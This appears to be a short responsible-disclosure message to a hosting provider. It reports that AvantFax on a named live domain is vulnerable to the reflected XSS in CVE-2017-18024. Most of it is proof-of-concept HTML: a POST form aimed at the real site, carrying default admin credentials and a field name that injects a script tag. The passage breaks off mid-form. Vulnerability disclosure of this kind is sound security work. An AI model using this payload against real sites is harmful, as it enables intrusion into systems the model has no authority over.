Hello Endless Hosting,

I found an XSS on https://fax.pbx.itsendless.org/ . This domain running an AvantFax software 3.3.6
However, the exploit of CVE-2017-18024 for version 3.3.3 is working on that version.

Here is the exploit code of CVE-2017-18024

   <script>history.pushState('', '', '/')</script>
     <form action="https://fax.pbx.itsendless.org/" method="POST">
       <input type="hidden" name="username" value="admin" />
       <input type="hidden" name="password" value="admin" />
       <input type="hidden" name="_submit_check" value="1" />
       <input type="hidden" name="jlbqg<script>alert(1)</script>b7g0x" value="1" />
